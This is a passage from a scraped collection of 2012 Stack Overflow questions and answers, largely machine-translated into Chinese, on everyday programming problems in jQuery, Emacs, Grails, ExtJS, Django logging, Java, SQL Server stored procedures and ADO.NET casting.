隐藏：[http](http://api.jquery.com/hide/) ://api.jquery.com/hide/ 并显示：[http ://api.jquery.com/show/](http://api.jquery.com/show/)

**否则**，您可以使用 javascript 将`display`属性从设置`none`为`block`。

# emacs - 在 Emacs 中按住键重复输入

> ID：12215423
> 
> 赞同：3
> 
> 时间：2012-08-31T12:29:27.087
> 
> 标签：emacs, key, sequence, repeat

如何降低/消除延迟，并在按住一个键时加快插入附加键？

例如：如果你想输入一个长`"ffffffffffffff"`序列，当你不关心究竟有多少个 f 时，按住`f`得到结果需要相当长的时间。

初始延迟相当长，延迟后f出现的速度也不是最快的。有谁知道涉及哪些参数，以及如何更改它们？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-31T16:39:29.870

按键重复设置始终由您未说明的基本操作系统控制。在 windows、osx、Linux（以及现在几乎所有东西）的控制面板或设置配置中，有两个设置控制键重复。第一个是重复开始之前的延迟时间，第二个是重复发生的速度。

在 unix 系统上（即基于 X-window），还有一个`xset`命令行工具可以用来改变 keyrepeat：

```
# xset -h
... help output ...
To turn auto-repeat off or on:
    -r [keycode]        r off
     r [keycode]        r on
     r rate [delay [rate]] 
```

而且，正如有人所说，在 emacs 中插入一堆随机字符实际上更快，只需使用`ctrl-u`后跟随机数，然后按下键即可。或者，事实上，您也可以使用`alt-6 alt-4 f`。

（是的，从技术上讲，它`meta`在 emacs 中，但您的密钥可能标记为`alt`）

# grails - 如何处理 ajax 请求中的 grails 异常？

> ID：12215425
> 
> 赞同：3
> 
> 时间：2012-08-31T12:29:40.273
> 
> 标签：grails, groovy, error-handling

如果我发出常规请求，我可以在 UrlMappings.groovy 中定义对错误和异常的处理，如下例所示：

```
 "403"(controller: 'error', action: 'index', params:['code':'403'])
    "404"(controller: 'error', action: 'index', params:['code':'404'])
    "500"(controller: 'error', action: 'index', params:['code':'500'])
    "500"(controller: 'home', action: 'noPrivileges', exception: IllegalOperationException) 
```

然后我可以处理特定控制器中的错误并呈现我选择的视图，例如

```
class ErrorController {

    def index = {
        render view: "/errors/myErrorPage", model: [code: params.code]
    }
} 
```

这完美地工作，每当服务器上出现错误时，我都会得到我的错误页面。

现在我怎样才能为 ajax 请求实现相同的行为？我正在使用 grails [remoteFunction](http://grails.org/doc/latest/ref/Tags/remoteFunction.html)或[formRemote](http://grails.org/doc/latest/ref/Tags/formRemote.html)发出 ajax 请求。每当服务器上发生异常时，我想在 javascript 中执行相同的代码（例如，我想用 alert('There was an exception') 显示警报）。

上述方法不适用于 ajax 请求。我仍然返回一个错误，即使错误中有 myErrorPage.gsp 的内容，它也不会打印到我使用 formRemote 或 remoteFunction 的更新参数指定的 html 元素中。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-31T13:59:18.263

我终于找到了一个与用于处理标准请求的方法兼容的完全干净的解决方案。

您需要修改处理错误的操作，如下例所示：

```
class ErrorController {

    def index = {
        if (request.xhr) {
             response.status = 200
             render template: "/errors/myAjaxErrorTemplate", model: [code: params.code]
        } else {
             render view: "/errors/myErrorPage", model: [code: params.code]
        }
    }
} 
```

使用 request.xhr，您可以区分 ajax 请求和标准请求。在 ajax 请求中，您还需要通过将响应状态设置为 200 来告诉 grails 响应正常。

非常漂亮和干净。:) 我很惊讶这不能在任何地方用谷歌搜索......

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T12:44:11.850

`remoteFunction`触发几个事件`onFailure`和`on_ERROR_CODE`. 您可以使用该事件来显示警告消息。

[您可以在文档](http://grails.org/doc/latest/ref/Tags/remoteFunction.html)中查看更多详细信息

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-31T12:41:49.340

如果请求状态设置正确，您可以通过/的`onFailure`属性定义 JavaScript 函数。`remoteFunction``formRemote`

在此函数中，您可以在客户端处理您的异常。

使用文档中的示例，它可能如下所示：

```
<select onchange="${remoteFunction(action: 'bookByName',
                       update: [success: 'great', failure: 'ohno'],
                       params: '\'bookName=\' + this.value'),
                       onFailure: 'handleError'}">
    <option>first</option>
    <option>second</option>
</select> 
```

# javascript - 如何将 onChange 方法添加到 ExtJS 4 表单中的所有字段（textField）

> ID：12215426
> 
> 赞同：2
> 
> 时间：2012-08-31T12:29:40.473
> 
> 标签：javascript, extjs4

如何将***更改事件***添加到窗口内表单的所有“文本字段”？首先，我创建一个带有表单的窗口。所有字段都使用 0 值初始化。我想检测用户输入（可能使用***dirtychange***），如果大于 1 则更改 textField 的背景颜色。

这是我目前的代码：

```
Ext.define('WPT.view.HoursPerMonthWindow', {
  extend: 'Ext.window.Window',
  alias : 'widget.hourspermonthwindow',
  title : 'Hours per Months',
  layout: 'fit',
  autoShow: true,   

  initComponent: function() {
    this.items = [
    {
        xtype: 'form',           
        items: [
        {
            xtype: 'textfield',
            name : 'january',
            itemId: 'january',
            fieldLabel: 'January'            
        },
        {
            xtype: 'textfield',
            name : 'february',
            itemId: 'february',
            fieldLabel: 'February'
        }
        ,
        {
            xtype: 'textfield',
            name : 'march',
            itemId: 'march',
            fieldLabel: 'March'
        },
        {
            xtype: 'textfield',
            name : 'april',
            itemId: 'april',
            fieldLabel: 'April'
        },
        {
            xtype: 'textfield',
            name : 'may',
            itemId: 'may',
            fieldLabel: 'May'
        },
        {
            xtype: 'textfield',
            name : 'june',
            itemId: 'june',
            fieldLabel: 'June'
        },
        {
            xtype: 'textfield',
            name : 'july',
            itemId: 'july',
            fieldLabel: 'July'
        },
        {
            xtype: 'textfield',
            name : 'august',
            itemId: 'august',
            fieldLabel: 'August'
        },
        {
            xtype: 'textfield',
            name : 'september',
            itemId: 'september',
            fieldLabel: 'September'
        },
        {
            xtype: 'textfield',
            name : 'october',
            itemId: 'october',
            fieldLabel: 'October'
        },
        {
            xtype: 'textfield',
            name : 'november',
            itemId: 'november',
            fieldLabel: 'November'
        },
        {
            xtype: 'textfield',
            name : 'december',
            itemId: 'december',
            fieldLabel: 'December'
        }                   
        ]           
    }
    ];

    this.buttons = [
    {
        text: 'Save',
        action: 'save'
    },
    {
        text: 'Cancel',
        scope: this,
        handler: this.close
    }
    ];

    this.callParent(arguments);
  }
}) 
```

你对这个问题有什么建议吗？谢谢你的帮助曼内尔

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T13:18:24.943

Extjs 提供了一种非常简单的添加监听器的方法，尤其是 extjs 4 mvc 架构。您应该将侦听器添加到视图的控制器

```
Ext.define('App.controller.SomeController', {
    extend:'Ext.app.Controller',
    init:function () {
       this.control({
            'hourspermonthwindow > form > textfield':{
                change: this.handleOnChange
            }
       });
    },
    handleOnChange:function(textfield,newValue,oldValue){
    //your code here
    }
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-10T14:06:27.957

代替 `{xtype : 'textfield' ... }`

我有新的 Ext.form.TextField 字段，我尝试了这个并完美地工作

```
new Ext.form.TextField({enableKeyEvents: true ,
    listeners : {
        change : function (f, e){
            action_form_update_brdoutput(null, frmBRDOutput.getForm().getValues());
        }
    }
}) 
```

Extjs 为您提供了侦听器，因此您可以重载它们。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-31T12:41:34.770

定义一个新组件，在其中扩展`textfield`并添加侦听器，然后在您的表单中使用它。

只需一个简单的`change`侦听器即可。

然后添加一个带有颜色的 css 类，或者如果您需要为每一行使用不同的颜色，然后通过代码设置它并使用`color`您传递给新组件的自定义 var

# installation - How can I install my C++ library on my client's machine?

> ID：12215432
> 
> 赞同：0
> 
> 时间：2012-08-31T12:30:03.283
> 
> 标签：installation

I have written a C++ library which will be used for POS applications, Library are to be distributed as binaries(DLL only for windows) to customers

I have understood that library can be used in 3 ways on client machine

1.  By placing binaries in the directory/folder of application executable
2.  By copying binaries to system32 directory
3.  By adding path of the binaries on client machine to PATH environment variable

Kindly educate me if there is a better way of installing library on the client machine, Which is the best way to install the distributed binaries on the client machine?

Thanks in advance

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T12:35:35.417

I strongly recommend you, to put the library into the application folder: Putting it into system32 is an invitation to DLL hell: A newer version in the app directory would be overruled by an older version in system32.

There is quite an easy rule:

*   if the library is intended for a special application, store it with the app
*   if the library is intended for general consumption, store it in system32

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T13:20:47.060

I always bind the dll's in my application. Its the safest approach i know.

# python - 管理命令的单独日志记录

> ID：12215436
> 
> 赞同：1
> 
> 时间：2012-08-31T12:30:14.760
> 
> 标签：python, django, logging, django-manage.py

如何在 Django 中配置日志记录以默认使用 Sentry 来处理所有`WARNING`和更高级别的消息，但是当我运行管理命令时将其降低`INFO`并添加控制台记录器？

在正常操作中（通过 mod_python 或 uWSGI 运行站点），我只关心`WARNING`和更高。但是，我们有一些通过 cronjobs 运行的管理命令，我也想`INFO`在日志文件中收集它们的消息（在管理命令中，但也在更深层次的代码中）。一些管理命令来自外部库，我不希望更改它们（在那里添加额外的初始化）。理想情况下，我想在设置模块中检测我们是通过`manage.py`还是通过 WSGI 运行的。

`LOGGING`我当前字典的相关部分：

```
 'root': {
        'level': 'WARNING',
        'handlers': ['sentry'],
    },
    'handlers': {
        'console': {
            'level': 'INFO',
            'class': 'logging.StreamHandler',
        }.
        'sentry': {
            'level': 'WARNING',
            'class': 'raven.contrib.django.handlers.SentryHandler',
        },
    }, 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-10-09T11:08:55.067

您可以对管理命令使用不同的设置`./manage.py my_task --settings=proj.settings.management`，对吗？因此，您可以覆盖日志记录部分并从原始设置文件中“继承”其余部分...或者我是否遗漏了您的问题的某些要点？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T12:30:14.760

一个很粗暴的方法：修改`manage.py`在环境中添加一些东西，并在设置模块中检测到这一点。

在`manage.py`：

```
import os
os.environ['DJANGO_IS_MANAGEMENT_COMMAND'] = '1' 
```

在设置模块中：

```
if os.environ.get('DJANGO_IS_MANAGEMENT_COMMAND', False):
    LOGGING['root']['level'] = 'INFO'
    LOGGING['root']['handlers'].append('console') 
```

这也会在运行 Celery 工作者时添加记录器，但我认为守护进程没有标准输出，所以没关系？

# javascript - 给定兄弟状态的jquery选择子元素

> ID：12215442
> 
> 赞同：-2
> 
> 时间：2012-08-31T12:30:31.687
> 
> 标签：javascript, jquery, jquery-selectors

给定一个html，例如：

```
<ul id="timesheetList">                                              
<li>
    <table>
        <tbody>
            <tr>
                <td>
                    <input type="checkbox" class="bigcheck">
                </td>
                <td>
                    <p class="hiddenId">73</p>
                </td>
            </tr>
        </tbody>
    </table>
</li>
<li>
    <table>
        <tbody>
            <tr>
                <td>
                    <input type="checkbox" class="bigcheck">
                </td>
                <td>
                    <p class="hiddenId">44</p>
                </td>
            </tr>
        </tbody>
    </table>
</li>
    <!-- the list goes on... --> 
```

如何为类为“bigcheck”的所有“已检查”（其状态已检查）复选框选择所有 IDS（在本例中为 44 和 73）？

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-31T12:35:07.723

你可以使用这样的东西：

```
var tds = $('td p.hiddenId').filter(function() {
    return $(this).parent().prev().children('input.bigcheck:checked').length != 0;
});
// tds contains the list of TDs matching your criteria 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-31T12:43:17.390

1.  首先获取所有选中的复选框。你可以使用

    $("input:checkbox[name=type]:checked").each(function(){

    });

    1.  然后，您需要使用 parentNode() 到达 TD
    2.  然后，使用 nextSibling() 来立即到达下一个 TD。
    3.  然后，TD.childNodes[1].innerHTML，会给你结果

注意：如果你使用这种方法，那么你的结构应该保持不变。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-31T12:51:44.847

试试这个：

```
var ids = [];
$("td > input.bigcheck:checked").each(function() {
    ids.push($(this).parent().next("td").children("p").text());
});
console.log(ids); 
```

您应该等待可能为您提供完整解决方案的答案，而不是接受只是指导的东西

# javascript - 生命之光 javascript IE8

> ID：12215445
> 
> 赞同：1
> 
> 时间：2012-08-31T12:30:40.157
> 
> 标签：javascript, internet-explorer-8, dojo, liferay

目前在 liferay 网站上工作并遇到 IE8 浏览器问题。当我加载页面时，我收到了 Javascript 错误。

'undefined' 为 null 或不是对象 dojo.xd.js 第 14 行字符 31332

当我在 Chrome 和 Firefox 中加载同一页面时，我没有看到任何 java 脚本错误。对于 IE，我无法像处理 dojo 源文件那样进行太多操作，也无法弄清楚它。我也尝试过一个接一个的移除dojo组件，看看能不能隔离问题。但它没有帮助并得到同样的错误。有没有更好的方法来调试这个问题/任何其他有助于获取更多信息/建议的工具？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T16:01:32.843

浏览器和服务器之间是否有数据传输。如果是这样，请粘贴到此处或检查 JSON 格式是否正确。额外的逗号，大括号通常是罪魁祸首。

Firefox 和 Chrome 是放松型浏览器并自行调整。

# jquery - 无法让 Jquery 对话框正常工作

> ID：12215446
> 
> 赞同：0
> 
> 时间：2012-08-31T12:30:49.697
> 
> 标签：jquery, jquery-ui, dialog, modal-dialog, jquery-ui-dialog

我启动了一个 jquery 对话框，它的“正常”`color`样式为黑色。在对话框内有一个`div`（与对话框的主`div`容器分开）包含文本（比如“mickeymouse”）。

我有一个`var=mycolor`保存 html的 javascript 变量`color`（颜色经常改变，就在对话框启动之前，所以颜色需要保留在变量中）。

如果 var`mycolor=red`我不知道如何将“mickeymouse”文本着色为红色（或`mycol`当前持有的任何颜色），同时将对话框的其余内容保留为“正常”黑色。

我最初在[这里](https://stackoverflow.com/questions/12202448/how-do-i-style-the-contents-of-a-jquery-dialog-box)发布了这个问题，但后来意识到它太长了。另外，从那时起，我一直在使用`dialogClass`from jquery 并想提一下我无法让它工作，所以我把它作为一个不同的问题发布了。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T13:44:48.237

我不完全确定您在寻找什么……</p>

但是，如果您想使用 JQuery 更改 ID 为“迪士尼”的 div 的颜色，您可以这样做

```
$("#disney").css("color", "yourcolour"); 
```

然后，您可以将“youcolour”替换为您谈到的变量。

* * *

我已经一起编写了一些代码来向您展示我的意思。它将打开一个对话框，然后将其中的文本更改为“myColour”指定的颜色

JavaScript

```
var myColour = "red"

$(function(){
    $('#dialog').dialog({
        autoOpen: false,
        width: 600,
        buttons: {
            "Ok": function() {
                $(this).dialog("close");
            },
            "Cancel": function() {
                $(this).dialog("close");
            }
        }
    });

    $('#dialog_link').click(function(){
        $('#dialog').dialog('open');
        change();
        return false;
    });

});

function change(){
    $("#newColour").css("color", myColour);
} 
```

HTML

```
<div id="dialog">
<div>test</div>
<div id="newColour">Text that changes Colour</div>

</div>

<p><a href="#" id="dialog_link" >Open Dialog</a></p> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T13:32:47.630

所以我把问题分解成两个部分：

1.  能够将 STATIC 分配给`color`对话框`div`内部
2.  将 STATIC 更改`color`为包含在变量中的 DYNAMIC

好消息是我已经解决了第 1 部分 - “为我欢呼”（我会为我欢呼，因为我在这个问题上独自一人，没有人帮助我 - 这是一个孤独的地方！）

对于像我这样的任何其他迷失的灵魂 - 这是第 1 部分的答案：

`div`a)在主对话框内添加一个 ID `div`（我在这里使用了“迪士尼”）：

```
<div id="thedialog">
    <div>goofy</div>
    <div id="disney">mickeymouse</div>
</div> 
```

b) 添加一个引用上述 ID 的新类（'dialoghoney' 可以是任何名称）：

```
.dialoghoney #disney {color:yellow; } 
```

c)`dialogClass`在对话框代码中添加一行：

```
$( "#thedialog" ).dialog({
    title: "Life's like a box of chocolates....",
    dialogClass:"dialoghoney"
}); 
```

上述结果是“goofy”采用了正确的主对话框颜色（在我的情况下为黑色），而“mickeymouse”采用了新的黄色颜色。

现在，这解决了第 1 部分的静态颜色。

PART 2 我做不到，所以如果有人能提供帮助，那就太好了！

# java - 有没有办法让这个 Java 程序更具交互性？

> ID：12215447
> 
> 赞同：1
> 
> 时间：2012-08-31T12:30:54.277
> 
> 标签：java

我编写了以下非常简单的 Java 程序，要求用户输入文件名，然后它将该文件的行数报告到标准输出：

```
import java.io.*;
import java.util.*;

public class CountLine {

 public static void main(String[] args) 
 {

     //  prompt the user to enter their file name
    System.out.print("Please enter your file name: ");

    //  open up standard input
      BufferedReader br = new BufferedReader(new InputStreamReader(System.in));

      String fileName = null;

      //  read the username from the command-line; need to use try/catch with the
      //  readLine() method
      try {
         fileName = br.readLine();
      } catch (IOException ioe) {
         System.out.println("IO error trying to read your name!");
         System.exit(1);
      }

      System.out.println("Thanks for the file name, " + fileName);

    File file = new File("C:/Users/Will/Desktop/"+fileName);
    Scanner scanner;
    try {
        scanner = new Scanner(file);

    int count =0;
    String currentLine;

    while(scanner.hasNextLine())
    {
        currentLine=scanner.nextLine();
        count++;

    }

    System.out.println("The number of lines in this file is "+count);
    } catch (FileNotFoundException e) {
        // TODO Auto-generated catch block
        System.out.println("There is no such file");
        e.printStackTrace();
    }
} 
```

}

它正在工作。如果专家能帮助我，我将非常感激

1.  看看这个代码片段有什么可以改进的，
2.  如果未找到该文件，则在最外层的 catch 语句中捕获异常并打印出堆栈跟踪。但是，我觉得不是很人性化，有没有办法如果文件不存在，那么整个过程从头开始？

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T12:37:13.240

明显的变化是创建一个`countLines(String filename)`包含当前 main() 中的大部分代码的方法。显然 main() 将调用 countLines()。

提示文件可能存在于 main() 或其他方法中。

要重新启动错误，您需要一个循环，例如：

```
filename = // read filename from stdin;
while(keepGoing(filename)) { // null check or whatever to let you out of the loop
    try {
         int numLines = countLines(filename);
         println("num lines in " + filename + "=" +numLines);
    }
    catch(Exception ex) { // or just specific excpetions
        ex.printStackTrace();
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T12:43:08.713

在您的代码中获取一些结构：

```
public static void main(String[] args) 
{
  string output;
  string fname = readFileName();
  if (fileValid(fname)) //Ensure FileExists
  {
     int lineCount = scaneFile(fname);   
     output = "some output text including line numbers"   
  }  
  else
  {
    output = "File Not Valid..."
  }
  //showOutput...
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-31T13:13:13.650

除非你想制作一个 GUI。我建议您将文件的路径作为命令行参数接收。

如果文件不存在，则打印一条消息并退出。就这样。

命令行将为用户提供使用向上键向上移动、编辑名称并再次运行的选项。

**这个类被命名为 LineCounter，是“业务逻辑”**

```
package countlines;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;

public class LineCounter {

    private int lineCount = 0;
    public LineCounter(File file) throws IOException{
        BufferedReader inFile = new BufferedReader(new FileReader(file));
        while(inFile.readLine() != null) {
            lineCount++;
        }
        inFile.close();
    }

    public int getLineCount() {
        return lineCount;
    }   

} 
```

**这个类是“表示逻辑”**

```
package countlines;

import java.io.File;
import java.io.IOException;

public class Main {
    public static void main (String[] args){
        if (args.length != 1){
            System.out.println("Usage: java countlines/Main filePath");
            System.exit(1);
        } 

        File f = new File(args[0]);

        if (!f.exists()){
            System.out.println("File "+f.getAbsolutePath()+" doesn't exist");
            System.exit(2);
        }

        if (f.isDirectory()){
            System.out.println(f.getAbsolutePath()+" is a directory");
            System.exit(2);         
        }

        LineCounter c;
        try {
            c = new LineCounter(f);
            System.out.println(c.getLineCount());
        } catch (IOException e) {
            System.out.println("Error reading file " + f.getAbsolutePath());
        }

    }
} 
```

# vb.net - VB.net 使用存储过程插入多个相关表。只有第一个表接收插入的行

> ID：12215449
> 
> 赞同：0
> 
> 时间：2012-08-31T12:31:09.567
> 
> 标签：vb.net, visual-studio-2008, stored-procedures, sqldataadapter, insert-into

存储过程 ins_address 如果单独使用，则可以正常工作，没有错误。使用 VB 代码（如下所示）时，不会将行插入到 tbl_AddressEntity 中。tbl_Address 可以，没关系。我绞尽脑汁将近两天，准备跳崖了。谁能告诉为什么该行不会插入到第二个表中？谢谢你。

`

```
ALTER PROCEDURE [dbo].[ins_address]
@AddressLine1 AS VARCHAR(60),
@AddressLine2 AS VARCHAR(60),
@AddressLine3 AS VARCHAR(60),
@TownText AS VARCHAR(30),
@CountyText AS VARCHAR(30),
@PostcodeTownDistrictID AS INT,
@PostcodeOutwardCode AS VARCHAR(4),
@PostcodeInwardCode AS VARCHAR(3),
@SiteID AS INT,
@CompanyBranchID AS INT,
@PersonID AS INT,
@AddressTypeID AS INT,
@AddressID AS INT = -1 OUTPUT

AS 

BEGIN TRY
INSERT INTO tbl_Address 
(
AddressLine1, 
AddressLine2, 
AddressLine3, 
TownText, 
CountyText,
PostcodeTownDistrictID,
PostcodeOutwardCode,
PostcodeInwardCode
)
VALUES 
(
@AddressLine1, 
@AddressLine2, 
@AddressLine3, 
@TownText, 
@CountyText,
@PostcodeTownDistrictID,
@PostcodeOutwardCode,
@PostcodeInwardCode
);

RETURN SCOPE_IDENTITY();

SELECT @AddressID = SCOPE_IDENTITY();

INSERT INTO tbl_AddressEntity
(
AddressID,
SiteID,
CompanyBranchID,
PersonID,
AddressTypeID
)
VALUES
(
@AddressID,
@SiteID,
@CompanyBranchID,
@PersonID,
@AddressTypeID
);

END TRY

BEGIN CATCH
 DECLARE
        @ErrorMessage nvarchar(2048)
        ,@ErrorSeverity int
        ,@ErrorState int

    SELECT
        @ErrorMessage = ERROR_MESSAGE()
        ,@ErrorSeverity = ERROR_SEVERITY()
        ,@ErrorState = ERROR_STATE();

IF @@TRANCOUNT > 0

    RAISERROR(@ErrorMessage, @ErrorSeverity, @ErrorState);

END CATCH 
```

`

* * *

```
`

Private Sub UBSave_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles UBSave.Click
          Try

                    If Not formOptions(0).Contains("Company Customer") Then
                        'Force commit of data changes to DS
                        **Me.UGAddresses.UpdateData()**
                        Me.UGContactInformation.UpdateData()

                        'Merge text boxes into DS
                        getNonCompanyCustomerFields()

                        'Save the contact first!
                        kernel.updateContact(Me.DsContact1)

                        'Now assuming we have the PKID from the contact insert, update associations to match!
                        If formOptions(0).Contains("New") Then
                            For Each row As DataRow In DsAddress1.Tables(0).Rows
                                If row.RowState = DataRowState.Added Then
                                    If row.Item("PersonID") Is System.DBNull.Value Then
                                        row.Item("PersonID") = DsContact1.Tables(0).Rows(0).Item("PersonID")
                                    End If
                                End If
                            Next
                            For Each row As DataRow In DsContactInfo1.Tables(0).Rows
                                If row.RowState = DataRowState.Added Then
                                    If row.Item("PersonID") Is System.DBNull.Value Then
                                        row.Item("PersonID") = DsContact1.Tables(0).Rows(0).Item("PersonID")
                                    End If
                                End If
                            Next
                            If Me.UTCMain.Tabs("Customer").Visible Then
                                Me.DsCustomers1.Tables(0).Rows(0).Item("PersonID") = DsContact1.Tables(0).Rows(0).Item("PersonID")
                            End If
                        End If

                        **kernel.updateAddresses(Me.DsAddress1)**
                        kernel.updateContactInfo(Me.DsContactInfo1)
                        If Me.UTCMain.Tabs("PersonCustomer").Visible Then
                            kernel.updateCustomer(Me.DsCustomers1)
                        End If
                        Me.Text = Me.Text.Replace(" *", "")

                        'Company Customer
                    Else
                        getCompanyCustomerFields()
                        kernel.updateCustomer(Me.DsCustomers1)
                        Me.Text = Me.Text.Replace(" *", "")
                    End If
                Catch ex As Exception
                    MsgBox("Exception thrown during save : " & ex.Message, MsgBoxStyle.Exclamation)
                    mySharedFunctions.LogProgress("frmContact.UBSave_Click - Error : " & ex.Message & vbCrLf & ex.StackTrace)
                    If Not ex.InnerException Is Nothing Then
                        mySharedFunctions.LogProgress("Inner exception : " & ex.InnerException.Message)
                    End If
                End Try
        End Sub 
```

`

* * *

数据适配器更新过程：`

```
Public Sub updateAddresses(ByRef dsTemp As dsAddress)

            'For inserts we're passing back the new PKID amd syncing with the dataset via the source column mapping on the insert command. 
            'So we should be able to update by ref.
            Me.SqlDaAddress.Update(dsTemp)
        End Sub 
```

`

* * *

DsAddress1 数据集包含一个表，其中包含相关存储过程中此 select 语句的结果：`

```
ALTER PROCEDURE [dbo].[get_address_by_companybranch_or_person]
/*@SiteID AS INT = -1,*/
@CompanyBranchID AS INT = -1,
@PersonID AS INT = -1

AS

IF @CompanyBranchID != -1
BEGIN

    SELECT     dbo.tbl_Address.AddressID, dbo.tbl_Address.AddressLine1, dbo.tbl_Address.AddressLine2, dbo.tbl_Address.AddressLine3, 
                      dbo.tbl_Address.TownText, dbo.tbl_Address.CountyText, dbo.tbl_Address.PostcodeTownDistrictID, dbo.tbl_Address.PostcodeOutwardCode, 
                      dbo.tbl_Address.PostcodeInwardCode, dbo.tbl_AddressEntity.SiteID, dbo.tbl_AddressEntity.CompanyBranchID, dbo.tbl_AddressEntity.PersonID, 
                      dbo.tbl_AddressEntity.AddressTypeID
    FROM         dbo.tbl_Address INNER JOIN
                      dbo.tbl_AddressEntity ON dbo.tbl_Address.AddressID = dbo.tbl_AddressEntity.AddressID
    WHERE     CompanyBranchID = @CompanyBranchID

END
ELSE

BEGIN

    SELECT     dbo.tbl_Address.AddressID, dbo.tbl_Address.AddressLine1, dbo.tbl_Address.AddressLine2, dbo.tbl_Address.AddressLine3, 
                      dbo.tbl_Address.TownText, dbo.tbl_Address.CountyText, dbo.tbl_Address.PostcodeTownDistrictID, dbo.tbl_Address.PostcodeOutwardCode, 
                      dbo.tbl_Address.PostcodeInwardCode, dbo.tbl_AddressEntity.SiteID, dbo.tbl_AddressEntity.CompanyBranchID, dbo.tbl_AddressEntity.PersonID, 
                      dbo.tbl_AddressEntity.AddressTypeID
    FROM         dbo.tbl_Address INNER JOIN
                      dbo.tbl_AddressEntity ON dbo.tbl_Address.AddressID = dbo.tbl_AddressEntity.AddressID 
    WHERE   PersonID = @PersonID

END 
```

`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T12:33:48.580

为什么是这条线？

```
RETURN SCOPE_IDENTITY(); 
```

此时您退出存储过程而不执行剩余的代码。

[MSDN](http://msdn.microsoft.com/en-us/library/ms174998.aspx)说

```
Exits unconditionally from a query or procedure. RETURN is immediate and complete 
and can be used at any point to exit from a procedure, batch, or statement block. 
Statements that follow RETURN are not executed. 
```

...请不要跳.... :-)

# java - 扩展 MultiLineRule （或类似的）以停止两个标记之一

> ID：12215451
> 
> 赞同：0
> 
> 时间：2012-08-31T12:31:14.777
> 
> 标签：java, eclipse, plugins, eclipse-plugin, jface

我希望为一个 Eclipse 插件项目做出贡献，其目的是为 Cucumber/Gherkin 语言（特别是 cucumber-jvm）提供一个编辑器。这个编辑器使用 JFace 来呈现编辑器。

我在项目中看到 org.eclipse.jface.text.rules.RuleBasedPartitionScanner 被扩展为将小黄瓜文件分成其组成部分。执行此操作的规则是从 org.eclipse.jface.text.rules.MultiLineRule 扩展而来的。

MultiLineRule 是 org.eclipse.jface.text.rules.PatternRule 的扩展，用于查找 startSequence 和 endSequence。我遇到的问题是我想寻找一个 endSequence 可以是两件事之一（“场景”或“背景”）。

关于如何实现这一点的任何想法？我是一个 Eclipse 插件新手，但想学习 :)

提前致谢

# asp.net - 指定的强制转换在 EmployeeUtilityClass 中无效

> ID：12215452
> 
> 赞同：0
> 
> 时间：2012-08-31T12:31:25.760
> 
> 标签：asp.net, visual-studio, ado.net

我有一个表 empinf 字段

```
Empid int
EmpName Nvarchar
Salary Numeric 
```

我有一个包含方法 Getdetails 的 EmployeeUtility 类

```
public EmployeeDetails Getdetails(int employeeId)
    {
        SqlConnection con = new SqlConnection(connectionString);
        SqlCommand cmd = new SqlCommand("SelectEmployee", con);
        cmd.CommandType = CommandType.StoredProcedure;
        cmd.Parameters.Add(new SqlParameter("@Id",SqlDbType.Int,4));
        cmd.Parameters["@Id"].Value=employeeId;

            try
               {
        con.Open();

        SqlDataReader reader = cmd.ExecuteReader();
        if (!reader.HasRows) return null;
        reader.Read();
        EmployeeDetails emp = new EmployeeDetails((int)reader["EmpId"], (string)reader["EmpName"], (int)reader["Salary"]);
        reader.Close();
        return emp;
    }
    catch (SqlException e)
    {
        throw new ApplicationException("Data error.");

    }
    finally
    {
        con.Close();
    }

    } 

EmployeeDetails emp=new EmployeeDetails((int)reader["EmpId"],(string)reader["EmpName"],(int)reader["Salary"]); 
```

它在这一行显示一个错误，表明`Specified cast is not valid.`请需要帮助。

我的employeeDetails 类如下：

```
public class EmployeeDetails
{
    private int employeeID;
    public int EmployeeID
    {
        get { return employeeID; }
        set { employeeID = value; }
    }

    private string employeeName;
    public string EmployeeName
    {
        get { return employeeName; }
        set { employeeName = value; }
    }

    private int salary;
    public int Salary
    {
        get { return salary; }
        set { salary = value; }
    }

    public EmployeeDetails(int employeeId, string employeeName, int salary)
    {
        EmployeeID = employeeID;
        EmployeeName = employeeName;
        Salary = salary;
    }

    public EmployeeDetails()
    {
        // TODO: Complete member initialization
    }

} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T12:37:59.487

我假设这个错误是运行时异常，而不是编译器错误？

问题不在于你的`EmployeeDetails`班级——而在于其中之一

```
(int)reader["EmpId"], (string)reader["EmpName"], (int)reader["Salary"] 
```

填充到数据读取器中的一个或多个值无法转换为`int`or `string`，原因可能是类型错误或为 null。

由于`EmpId`可能是一个标识列，因此不为空，我的钱要么`EmpName`是空的`Salary`列，要么是实际包含浮点数的列，或者是空的。在第二种情况下，您可以使用`int?`，除非它只是简单的不可靠数据，在这种情况下，请确保该列不可为空。

您可以使用`Convert`该类将列值转换为 .net 类型 - 因为它们实际上是 Sql 类型。也就是说，这些类型 -`SqlInt32`例如 - 确实支持直接转换`int`为 例如，但如果基础值为 null，它也会引发异常。也就是说，也会如此`Convert`；所以我想两者都可以。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-31T12:38:17.767

这主要是一个猜测，但它可能是这样的：

```
(int)reader["Salary"] 
```

